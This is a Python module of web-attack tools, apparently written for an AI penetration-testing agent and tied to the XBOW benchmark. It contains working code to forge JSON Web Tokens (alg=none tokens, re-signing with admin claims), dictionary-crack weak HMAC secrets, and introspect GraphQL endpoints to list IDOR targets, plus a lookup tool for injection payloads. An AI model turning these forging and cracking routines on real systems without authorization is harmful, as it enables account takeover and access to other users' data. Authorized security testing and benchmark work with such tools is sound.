"""
web_weapons.py - specialized web-attack tools (broken-authz is 24% of XBOW).

  - search_payloads : query the offline payload/technique corpus (don't invent).
  - jwt_tool        : parse / forge / alg-confusion / crack JWTs (RFC 7519).
  - graphql         : introspect a GraphQL endpoint and surface ID-shaped IDOR args.

Dependency-free (hmac/base64/hashlib/json only), so they work in any sandbox.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any, Optional

from plugins.sdk.base_tool import BaseTool, Permission, ToolResult
from security_tools.payloads import search_payloads, VULN_CLASSES


# ------------------------------------------------------------------ #
# Payload corpus tool
# ------------------------------------------------------------------ #

class SearchPayloadsTool(BaseTool):
    name = "search_payloads"
    description = (
        "Look up REAL attack payloads/techniques from a curated offline corpus instead "
        "of inventing them. Search by vuln_class (sqli, xss, ssti, rce, lfi, ssrf, xxe, "
        "idor, auth, upload, deserialization) and/or a keyword. Returns the payload "
        "string + bypass notes. USE THIS before hand-crafting an injection/auth payload."
    )
    parameters = {
        "type": "object",
        "properties": {
            "vuln_class": {"type": "string",
                           "description": f"One of: {', '.join(VULN_CLASSES)}"},
            "keyword": {"type": "string",
                        "description": "Optional keyword filter, e.g. 'imds', 'jinja', 'blind'"},
        },
    }
    permissions: set = set()
    tags = ["web", "payloads", "reference", "knowledge"]

    async def execute(self, vuln_class: str = "", keyword: str = "",
                      **kwargs: Any) -> ToolResult:
        hits = search_payloads(vuln_class, keyword)
        if not hits:
            return ToolResult.ok(
                f"No payloads matched (class={vuln_class!r}, keyword={keyword!r}). "
                f"Available classes: {', '.join(VULN_CLASSES)}.")
        lines = [f"{len(hits)} payload(s):"]
        for p in hits[:25]:
            lines.append(f"\n[{p.vuln_class}] {p.title}\n  payload: {p.payload}"
                         + (f"\n  notes: {p.notes}" if p.notes else ""))
        return ToolResult.ok("\n".join(lines),
                             metadata={"count": len(hits), "class": vuln_class})


# ------------------------------------------------------------------ #
# JWT tool
# ------------------------------------------------------------------ #

def _b64url_decode(seg: str) -> bytes:
    seg = seg + "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg.encode("ascii"))


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _jwt_parts(token: str) -> tuple[dict, dict, str]:
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT (need header.payload[.signature])")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def _sign_hs(alg: str, signing_input: bytes, secret: bytes) -> str:
    algo = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
            "HS512": hashlib.sha512}[alg]
    return _b64url_encode(hmac.new(secret, signing_input, algo).digest())


class JwtTool(BaseTool):
    name = "jwt_tool"
    description = (
        "Parse, forge, and attack JSON Web Tokens (broken-authz). actions:\n"
        "- 'parse': decode a token's header + claims (no verification).\n"
        "- 'forge': re-sign a token with modified claims (json) using a known 'secret' "
        "(HS256/384/512), or 'alg_none' to strip the signature (alg=none attack).\n"
        "- 'crack': dictionary-attack an HS256/384/512 secret with a wordlist (list of "
        "candidate secrets) - confirms a weak signing key.\n"
        "Classic wins: alg=none, a weak HMAC secret, or (for RS256 servers that also "
        "accept HS256) signing with the RSA public key as the HMAC secret."
    )
    parameters = {
        "type": "object",
        "properties": {
            "action": {"type": "string", "description": "parse | forge | crack", "default": "parse"},
            "token": {"type": "string", "description": "The JWT to operate on"},
            "claims": {"type": "object", "description": "forge: claim overrides to merge (e.g. {\"role\":\"admin\"})"},
            "secret": {"type": "string", "description": "forge/crack: the HMAC secret (forge) - omit with alg_none"},
            "alg_none": {"type": "boolean", "description": "forge: produce an alg=none token", "default": False},
            "wordlist": {"type": "array", "items": {"type": "string"},
                         "description": "crack: candidate secrets to try"},
        },
        "required": ["action", "token"],
    }
    permissions: set = set()
    tags = ["web", "jwt", "auth", "authz"]

    async def execute(self, action: str = "parse", token: str = "",
                      claims: Optional[dict] = None, secret: str = "",
                      alg_none: bool = False, wordlist: Optional[list] = None,
                      **kwargs: Any) -> ToolResult:
        action = (action or "parse").lower()
        try:
            header, payload, sig = _jwt_parts(token)
        except Exception as exc:
            return ToolResult.fail(f"Could not parse JWT: {exc}")

        if action == "parse":
            return ToolResult.ok(
                f"Header: {json.dumps(header)}\nClaims: {json.dumps(payload, indent=2)}\n"
                f"Signature present: {bool(sig)} | alg: {header.get('alg')}")

        if action == "forge":
            new_claims = {**payload, **(claims or {})}
            if alg_none:
                h = {**header, "alg": "none"}
                tok = f"{_b64url_encode(json.dumps(h,separators=(',',':')).encode())}." \
                      f"{_b64url_encode(json.dumps(new_claims,separators=(',',':')).encode())}."
                return ToolResult.ok(f"alg=none token (empty signature):\n{tok}\n"
                                     "Send it where the original went; works if the server "
                                     "trusts the 'none' algorithm.")
            alg = header.get("alg", "HS256").upper()
            if alg not in ("HS256", "HS384", "HS512"):
                alg = "HS256"
            if not secret:
                return ToolResult.fail("forge needs a 'secret' (or set alg_none=true).")
            h = {**header, "alg": alg}
            si = (f"{_b64url_encode(json.dumps(h,separators=(',',':')).encode())}."
                  f"{_b64url_encode(json.dumps(new_claims,separators=(',',':')).encode())}")
            tok = si + "." + _sign_hs(alg, si.encode(), secret.encode())
            return ToolResult.ok(f"Forged {alg} token (secret={secret!r}):\n{tok}")

        if action == "crack":
            alg = header.get("alg", "HS256").upper()
            if alg not in ("HS256", "HS384", "HS512"):
                return ToolResult.fail(f"crack only supports HS*, token uses {alg}.")
            si = ".".join(token.split(".")[:2]).encode()
            for cand in (wordlist or ["secret", "password", "123456", "admin", "key",
                                      "changeme", "jwt", "s3cr3t"]):
                if _sign_hs(alg, si, cand.encode()) == sig:
                    return ToolResult.ok(f"CRACKED - secret is {cand!r}. Forge with "
                                         f"action=forge secret={cand!r}.",
                                         metadata={"secret": cand})
            return ToolResult.ok("No candidate secret matched. Provide a larger wordlist.")

        return ToolResult.fail("Unknown action. Use parse | forge | crack.")


# ------------------------------------------------------------------ #
# GraphQL tool
# ------------------------------------------------------------------ #

_INTROSPECTION = ("{__schema{queryType{name}mutationType{name}types{name kind "
                  "fields{name args{name type{name kind ofType{name kind}}}}}}}")


class GraphqlTool(BaseTool):
    name = "graphql"
    description = (
        "Attack a GraphQL endpoint. actions:\n"
        "- 'introspect': send an introspection query to <url> (via http_request-style "
        "network) and list every Query/Mutation field.\n"
        "- 'analyze': given introspection JSON (schema), enumerate fields and flag "
        "ID-SHAPED arguments (id, *Id, uuid) that are classic IDOR candidates.\n"
        "Introspection is often left enabled; ID-typed args are where broken access "
        "control lives - then test them with http_request/http_repeater."
    )
    parameters = {
        "type": "object",
        "properties": {
            "action": {"type": "string", "description": "introspect | analyze", "default": "introspect"},
            "url": {"type": "string", "description": "introspect: the GraphQL endpoint URL"},
            "schema": {"type": "object", "description": "analyze: introspection result JSON"},
        },
    }
    permissions = {Permission.NETWORK}
    tags = ["web", "graphql", "idor", "authz"]

    def __init__(self, session: Any = None, **kwargs: Any) -> None:
        super().__init__(**kwargs)
        self.session = session

    async def execute(self, action: str = "introspect", url: str = "",
                      schema: Optional[dict] = None, **kwargs: Any) -> ToolResult:
        action = (action or "introspect").lower()
        if action == "introspect":
            if not url:
                return ToolResult.fail("introspect needs a url.")
            from browser.http_client import HttpClient
            cookies = getattr(self.session, "cookies", None)
            async with HttpClient(timeout=20.0, cookies=cookies) as client:
                resp = await client.request("POST", url,
                                            json={"query": _INTROSPECTION})
            if resp.status_code and resp.status_code >= 400:
                return ToolResult.ok(
                    f"Introspection returned {resp.status_code} - it may be disabled. "
                    f"Body: {(resp.text or '')[:500]}")
            try:
                data = json.loads(resp.text)
                sch = data.get("data", {}).get("__schema", data.get("__schema"))
            except Exception:
                return ToolResult.ok(f"Non-JSON response ({resp.status_code}): "
                                     f"{(resp.text or '')[:500]}")
            return ToolResult.ok(self._analyze(sch or {}),
                                 metadata={"status": resp.status_code})
        if action == "analyze":
            sch = schema or {}
            sch = sch.get("data", {}).get("__schema", sch.get("__schema", sch))
            return ToolResult.ok(self._analyze(sch))
        return ToolResult.fail("Unknown action. Use introspect | analyze.")

    @staticmethod
    def _analyze(schema: dict) -> str:
        types = schema.get("types") or []
        qname = (schema.get("queryType") or {}).get("name")
        mname = (schema.get("mutationType") or {}).get("name")
        lines: list[str] = []
        idor: list[str] = []
        for t in types:
            if t.get("name") in (qname, mname) and t.get("fields"):
                role = "Query" if t["name"] == qname else "Mutation"
                for f in t["fields"]:
                    args = f.get("args") or []
                    argstr = ", ".join(a.get("name", "") for a in args)
                    lines.append(f"  [{role}] {f.get('name')}({argstr})")
                    for a in args:
                        an = (a.get("name") or "").lower()
                        if an == "id" or an.endswith("id") or "uuid" in an:
                            idor.append(f"{f.get('name')}.{a.get('name')}")
        out = ["GraphQL schema fields:"] + (lines or ["  (none found)"])
        if idor:
            out.append("\nID-shaped args (IDOR candidates - fuzz these):")
            out += [f"  - {x}" for x in idor]
        return "\n".join(out)
